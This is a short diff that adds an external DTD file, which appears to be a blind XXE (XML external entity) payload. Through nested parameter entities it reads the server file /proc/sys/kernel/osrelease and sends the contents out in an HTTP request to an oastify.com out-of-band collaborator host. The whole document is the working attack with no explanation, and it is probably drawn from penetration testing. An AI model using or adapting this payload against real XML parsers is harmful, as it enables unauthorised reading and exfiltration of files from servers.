@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/sys/kernel/osrelease">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://6ho7814h03yzneftf33v2l1m6dc40vxjm.oastify.com/?data=%file;'>">
+%eval;
+%exfil;
